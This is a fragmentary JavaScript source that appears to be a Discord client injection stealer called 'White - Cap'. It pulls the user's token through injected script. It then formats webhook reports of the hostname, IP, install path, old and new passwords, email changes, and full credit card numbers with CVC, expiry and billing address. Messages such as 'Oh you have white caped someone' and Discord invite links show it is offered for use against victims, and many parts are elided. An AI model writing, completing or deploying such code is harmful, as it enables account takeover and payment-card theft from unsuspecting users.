...
function FirstTime() {
	...
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
			...
			if (fs.existsSync(path.join(__dirname, "init"))) {
				...
				if (token == null || token == undefined || token == "") {
					var c = {
						...
						content: "",
						embeds: [{
							title: "White - Cap have been Initalized (User not Logged in)",
							color: config["embed-color"],
							fields: [{
								name: "WC - Informations",
								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
								inline: !1
							}],
							author: {
							...
							footer: {
								text: "©BRULNOX | https://discord.gg/3QPvhqFupb"
							}
						}]
					};
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							content: "",
							embeds: [{
								title: "White - Cap Initalized",
								description: "[**<a:whitecap:951878274173272065> │ Oh you have white caped someone**](https://discord.gg/3QPvhqFupb)",
								color: config["embed-color"],
								fields: [{
									name: "WC - Informations",
		...
		if (!fs.existsSync(path.join(__dirname, "Whitecap"))) {
			return !0
		}
			...
			if (config['logout-notify'] == "true") {
				if (token == null || token == undefined || token == "") {
					var c = {
						...
						content: "",
						embeds: [{
							title: "White Caped User log out (User not Logged in before)",
							color: config["embed-color"],
							fields: [{
								name: "WC - Informations",
								value: `\`\`\`Name Of Computer: \n${computerName}\nInjection Path: \n${__dirname}\n\`\`\``,
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								embeds: [{
                                    ...
                                    description: "[**<a:whitecap:951878274173272065> │ Oh you have white caped someone**](https://discord.gg/uKMbPwSapJ)",
									"color": config['embed-color'],
									"fields": [{
										name: "WC - Info",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								content: "",
								embeds: [{
									"title": "White Cap Detect Password Changed",
                                    description: "[**<a:whitecap:951878274173272065> │ Oh you have white caped someone**](https://discord.gg/uKMbPwSapJ)",
									"color": config['embed-color'],
									"fields": [{
										name: "WC - Info",
										...
										name: "WC - Old Password",
										value: `\`${oldpassword}\``,
										inline: !0
									}, {
										name: "WC - New Password",
										value: `\`${newpassword}\``,
										inline: !0
									}, {
										name: "WC - Token",
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								content: "",
								embeds: [{
									"title": "White Cap Detect Email Changed",
                                    description: "[**<a:whitecap:951878274173272065> │ Oh you have white caped someone**](https://discord.gg/uKMbPwSapJ)",
									"color": config['embed-color'],
									"fields": [{
										name: "WC - Info",
...
function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    ...
    `, !0).then((ip) => {
			...
			var params = {
				...
				content: "",
				embeds: [{
					"title": "White Cap User Credit Card Added",
					"description": "**WC - Username:**```" + json.username + "#" + json.discriminator + "```\n**WC - ID:**```" + json.id + "```\n**WC - Email:**```" + json.email + "```\n" + "**WC - Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**WC - Badges:**```" + GetBadges(json.flags) + "```" + "\n**WC - Credit Card Number: **```" + number + "```" + "\n**WC - Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**WC - CVC: **```" + cvc + "```\n" + "**WC - Country: **```" + country + "```\n" + "**WC - State: **```" + state + "```\n" + "**WC - City: **```" + city + "```\n" + "**WC - ZIP:**```" + zip + "```" + "\n**WC - Street: **```" + street + "```" + "\n**WC - Token:**```" + token + "```" + "\n**WC - IP: **```" + ip + "```",
					"author": {
						"name": "White - Cap"
					},
					"footer": {
